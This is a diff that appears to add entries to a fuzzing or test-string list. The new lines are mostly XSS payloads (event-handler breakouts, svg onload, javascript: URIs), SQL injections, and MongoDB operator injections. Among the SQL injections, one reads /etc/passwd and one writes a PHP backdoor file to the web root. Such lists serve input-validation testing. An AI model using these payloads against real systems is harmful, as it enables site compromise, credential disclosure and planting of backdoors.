@@ -423,6 +423,41 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 \";alert('XSS');//
 <u oncopy=alert()> Copy me</u>
 <i onwheel=alert(1)> Scroll over me </i>
+"><img src onerror=alert(1)>
+"/><img src=x onerror=alert(2);><!--
+'><img src onerror=alert(1)>
+'/><img src=x onerror=alert(2);><!--
+<--`<img/src=` onerror=alert(3)> --!>
+" autofocus onfocus=alert(4) fragment="
+" onclick=alert`5` fragment="
+' autofocus onfocus=alert(4) fragment='
+' onclick=alert`5` fragment='
+<details/open ontoggle=alert(6)>
+<svg/onload=alert``>
+javascript:alert(1)
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+'}alert(1);{'
+'}alert(1)%0A{'
+\'}alert(1);{//
+\u0027-confirm`1`-\u0027 
+"; ||confirm('XSS') || "
+'*prompt(1)*'
+{{32*32}}
+x");$=alert, $(1);//
+""});});});alert(1);$('a').each(function(i){$(this).click(function(event){x({y
+"])},alert(1));(function xss() {//
+'?prompt`1`?'
+" onmouseover=alert(/@darknetguy/)
+" onclick=alert(1)//">click
+" autofocus onfocus=alert(1) "
+" onfocus=prompt(1) autofocus fragment="
+" onfocus=prompt(1) onmouseover="confirm(1) " style="position:absolute;width:100%;height:100%;top:0;left:0;"
+" onmousemove=alert(/@darknetguy/)//">Milad
+"><svg onload=alert(1)>.gif
+http://www.<svg/onload=confirm(1)>.com
+"><svg/onload=confirm(1)>"@yahoo.com
 <plaintext>
 http://a/%%30%30
 </textarea><script>alert(123)</script>
@@ -431,6 +466,40 @@ http://a/%%30%30
 ' OR 1=1 -- 1
 ' OR '1'='1
 %
+'OR 1=1 LIMIT 1; #
+AND 1 = 2 UNION SELECT 1,2,3,4,5
+1 exec sp_
+1 and 1=1
+1' and 1=(select count(*) from tablenames); --
+1 or 1=1
+1' or '1'='1
+1or1=1
+1'or'1'='1
+fake@ema'or'il.nl'='il.nl
+1 union all select 1,2,3,4,load_file("/etc/passwd"),6
+1 union all select 1,2,3,4,"<?php ?>",6 into outfile '/var/www/html/backdoor.php'
+1'1
+'--
+1'||'1'<'2
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+[$ne]=1
+';sleep(5000);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
 _
 -
 --
